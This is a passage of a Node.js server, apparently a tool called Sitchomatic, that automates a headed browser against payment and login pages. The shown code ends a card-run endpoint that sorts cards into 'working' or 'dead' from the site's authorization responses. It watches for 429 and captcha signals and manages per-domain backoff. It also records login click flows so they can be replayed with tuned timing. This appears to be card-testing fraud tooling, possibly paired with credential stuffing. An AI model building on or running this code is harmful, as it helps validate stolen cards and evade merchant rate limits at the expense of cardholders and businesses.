      if (outcome === 'dead' && netSnap.authSuccess && !netSnap.authFailure) {
        outcome = 'working';
        note = 'Card accepted (confirmed by network response JSON)';
      }
      if (outcome === 'working' && netSnap.authFailure && !netSnap.authSuccess) {
        outcome = 'dead';
        note = 'Card rejected by network response JSON (DOM may be stale)';
      }
      if (outcome === 'working') resetDomainBackoff(host);
    }

    // Shot 4: final state
    await persist(await captureShotBuf(page, 'SCR 4/4'), 3, page);

  } catch (err) {
    if (signal.aborted) {
      note = 'Run cancelled by client';
      outcome = 'cancelled';
    } else {
      note = `Automation error: ${err.message}`;
      outcome = 'dead';
    }
    destroyContext = true;
    logEvent('error', 'card.error', { runId: runHandle.runId, error: err.message });
  } finally {
    if (lease) await releaseContext(lease, { destroy: destroyContext });
    endRun(runHandle, { outcome, kind: 'card' });
  }

  broadcast('card.result', { runId: runHandle.runId, outcome, note, shotUrls, htmlUrls });
  if (!res.headersSent) res.json({
    runId: runHandle.runId,
    outcome, note,
    shotUrls,
    htmlUrls,
    network: netSnap ? {
      saw429: netSnap.saw429,
      sawCaptcha: netSnap.sawCaptcha,
      authSuccess: netSnap.authSuccess,
      authFailure: netSnap.authFailure,
      statusCodes: [...netSnap.statusCodes],
    } : null,
  });
});

// ── API: Flow Recorder ────────────────────────────────────────────────────────

/**
 * In-memory state for the active flow recording session.
 * Only one session may be active at a time.
 * @type {{ step: number, labels: string[], selectors: string[], status: string, error: string } | null}
 */
let flowSession = null;

/**
 * Waits for the user's next interaction inside the recording browser.
 * Returns { selector, ts } when the user clicks a page element, or
 * { done: true } when the user presses the "✓ Done" button in the overlay bar.
 *
 * Selector priority: id → input type → name → placeholder → data-testid →
 *   aria-label → button text → first class → tag name.
 *
 * @param {import('playwright').Page} page
 * @returns {Promise<{selector: string, ts: number}|{done: true}>}
 */
async function waitForRecordedEvent(page) {
  return page.evaluate(() => new Promise(resolve => {
    function sel(el) {
      if (!el || el.tagName === 'BODY') return 'body';
      const tag = el.tagName.toLowerCase();
      if (el.id && /^[a-zA-Z_]/.test(el.id)) return '#' + el.id;
      const type = el.getAttribute('type');
      if (type === 'email')    return 'input[type="email"]';
      if (type === 'password') return 'input[type="password"]';
      if (type === 'submit')   return tag + '[type="submit"]';
      const name = el.getAttribute('name');
      if (name) return tag + '[name="' + name + '"]';
      const ph = el.getAttribute('placeholder');
      if (ph) return tag + '[placeholder="' + ph.replace(/"/g, '\\"') + '"]';
      const tid = el.getAttribute('data-testid');
      if (tid) return '[data-testid="' + tid + '"]';
      const al = el.getAttribute('aria-label');
      if (al) return '[aria-label="' + al.replace(/"/g, '\\"') + '"]';
      if (tag === 'button') {
        const txt = (el.textContent || '').trim().slice(0, 40);
        if (txt) return 'button:has-text("' + txt.replace(/"/g, '\\"') + '")';
      }
      if (el.className && typeof el.className === 'string') {
        const c = el.className.trim().split(/\s+/)[0];
        if (c) return tag + '.' + c;
      }
      return tag;
    }
    function handler(e) {
      // "Done" button inside the overlay bar → signal end of recording
      const doneBtn = document.getElementById('_sitcho_done_btn');
      if (doneBtn && (e.target === doneBtn || doneBtn.contains(e.target))) {
        e.preventDefault();
        e.stopPropagation();
        document.removeEventListener('click', handler, true);
        resolve({ done: true });
        return;
      }
      // Other clicks inside the overlay bar are ignored (don't record them)
      const bar = document.getElementById('_sitcho_rec_bar');
      if (bar && bar.contains(e.target)) return;

      e.preventDefault();
      e.stopPropagation();
      document.removeEventListener('click', handler, true);
      resolve({ selector: sel(e.target), ts: Date.now() });
    }
    document.addEventListener('click', handler, true);
  }));
}

/**
 * Injects or updates the recording overlay bar inside the headed browser.
 * Shows how many clicks have been captured so far and a "✓ Done" button.
 * @param {import('playwright').Page} page
 * @param {number} count - Number of clicks captured so far.
 */
async function updateRecordingOverlay(page, count) {
  await page.evaluate((count) => {
    let bar = document.getElementById('_sitcho_rec_bar');
    if (!bar) {
      bar = document.createElement('div');
      bar.id = '_sitcho_rec_bar';
      bar.style.cssText = [
        'position:fixed', 'top:0', 'left:0', 'right:0', 'z-index:2147483647',
        'background:rgba(0,0,0,0.88)', 'color:#fff',
        'padding:8px 16px', 'font:14px/1.4 system-ui,sans-serif',
        'display:flex', 'align-items:center', 'gap:12px',
        'border-bottom:2px solid #30d5c8',
      ].join(';');
      document.body.prepend(bar);
    }
    const badge = count === 0
      ? '<span style="background:#30d5c8;color:#000;padding:2px 8px;border-radius:4px;font-weight:700;white-space:nowrap">READY</span>'
      : '<span style="background:#30d5c8;color:#000;padding:2px 8px;border-radius:4px;font-weight:700;white-space:nowrap">CLICK ' + count + '</span>';
    bar.innerHTML =
      badge +
      '<span style="flex:1">Click elements in order (cookie dismiss → email → password → submit + any extras). Press <strong>✓ Done</strong> when finished.</span>' +
      '<button id="_sitcho_done_btn" style="background:#34c759;color:#000;border:none;padding:5px 14px;border-radius:4px;font-weight:700;cursor:pointer;font-size:13px;white-space:nowrap">✓ Done</button>';
  }, count);
}

/**
 * GET /api/record-flow/status
 * Returns the current flow recording session state.
 * Response: { active: bool, count: number, selectors: string[], status: string, error: string }
 */
app.get('/api/record-flow/status', (req, res) => {
  if (!flowSession) return res.json({ active: false });
  res.json({
    active:    true,
    count:     flowSession.count || 0,
    selectors: flowSession.selectors,
    status:    flowSession.status,
    error:     flowSession.error || '',
  });
});

/**
 * POST /api/record-flow
 * Opens a headed (visible) Chromium browser on the login page and records an
 * unlimited number of user clicks until the user presses the "✓ Done" button
 * in the overlay bar. Each click's selector and timestamp are captured.
 *
 * After recording, delays between consecutive clicks are computed so the UI
 * can show timing analysis. The automation can use these delays to tune waits.
 *
 * Request body: { loginUrl: string }
 * Response:     { selectors: string[], delays: number[], count: number }
 *               or { error: string }
 */
app.post('/api/record-flow', async (req, res) => {
  const { loginUrl } = req.body;
  if (!loginUrl) return res.status(400).json({ error: 'Missing loginUrl' });
  if (flowSession && flowSession.status === 'recording') {
    return res.status(409).json({ error: 'A recording session is already active. Close the browser window first.' });
  }

  flowSession = { count: 0, selectors: [], delays: [], status: 'recording', error: '' };

  let browser;
  try {
    browser = await chromium.launch({ headless: false, args: ['--window-size=1280,800'] });
    const context = await browser.newContext({
      viewport: { width: 1280, height: 800 },
      ignoreHTTPSErrors: true,
    });
    const page = await context.newPage();

    // If the user manually closes the browser window, stop the recording loop
    // gracefully instead of throwing from the next waitForRecordedEvent call.
    let userClosedBrowser = false;
    page.on('close', () => { userClosedBrowser = true; });
    browser.on('disconnected', () => { userClosedBrowser = true; });

    await page.goto(loginUrl, { waitUntil: 'domcontentloaded', timeout: 30000 });
    await page.waitForTimeout(1500);

    // Inject initial overlay with Done button; no step limit
    await updateRecordingOverlay(page, 0);

    // Allow up to 10 minutes total for the user to complete their recording
    page.setDefaultTimeout(600000);

    const clicks = []; // { selector: string, ts: number }

    while (true) {
      if (userClosedBrowser) break;
      const event = await waitForRecordedEvent(page).catch(() => null);

      // null (timeout/error/window closed) or explicit done → stop recording
      if (userClosedBrowser || !event || event.done) break;

      clicks.push(event);
      flowSession.count     = clicks.length;
      flowSession.selectors = clicks.map(c => c.selector);

      // Update overlay badge to reflect the running click count
      await updateRecordingOverlay(page, clicks.length).catch(() => {});
    }

    // Compute ms delay between each pair of consecutive clicks.
    // These can be used to tune automation timing for this specific site.
    const delays = [];
    for (let i = 1; i < clicks.length; i++) {
      delays.push(clicks[i].ts - clicks[i - 1].ts);
    }
    flowSession.delays = delays;

    // Show completion summary in the headed browser before it auto-closes
    const avgDelay = delays.length
      ? Math.round(delays.reduce((a, b) => a + b, 0) / delays.length)
      : 0;
    if (userClosedBrowser) {
      flowSession.status = 'done';
      return res.json({ selectors: flowSession.selectors, delays, count: clicks.length, closed: true });
    }

    await page.evaluate(({ count, avgDelay }) => {
      const bar = document.getElementById('_sitcho_rec_bar');
      if (bar) {
        bar.style.cssText = bar.style.cssText.replace('#30d5c8', '#28a046')
          .replace('rgba(0,0,0,0.88)', 'rgba(52,199,89,0.95)');
        bar.style.background = 'rgba(52,199,89,0.95)';
        bar.style.color = '#000';
        bar.style.borderColor = '#28a046';
        bar.innerHTML =
          '<strong>✓ ' + count + ' click' + (count !== 1 ? 's' : '') + ' recorded!</strong>' +
          (avgDelay ? '  Avg delay between clicks: <strong>' + avgDelay + ' ms</strong>' : '') +
          '  You can close this window.';
      }
    }, { count: clicks.length, avgDelay }).catch(() => {});

    await page.waitForTimeout(2500).catch(() => {});

    flowSession.status = 'done';
    if (!res.headersSent) {
      res.json({ selectors: flowSession.selectors, delays, count: clicks.length });
    }

  } catch (err) {
    flowSession.status = 'error';
    flowSession.error  = err.message;
    if (!res.headersSent) res.status(500).json({ error: err.message });
  } finally {
    if (browser) await browser.close().catch(() => {});
  }
});

// ── Start ─────────────────────────────────────────────────────────────────────

app.listen(PORT, () => {
  console.log(`Sitchomatic server running at http://localhost:${PORT}`);
  console.log(`  Webapp:     http://localhost:${PORT}/`);
  console.log(`  Status:     http://localhost:${PORT}/api/status`);
  console.log(`  SSE events: http://localhost:${PORT}/api/events`);
  console.log(`  Shots:      http://localhost:${PORT}/shots/<runId>/<n>.png`);
  console.log(`  Mode:       LIVE browser automation (persistent pool + disk shots + SSE)`);
  logEvent('info', 'server.start', { port: PORT, version: '1.3.0' });
});
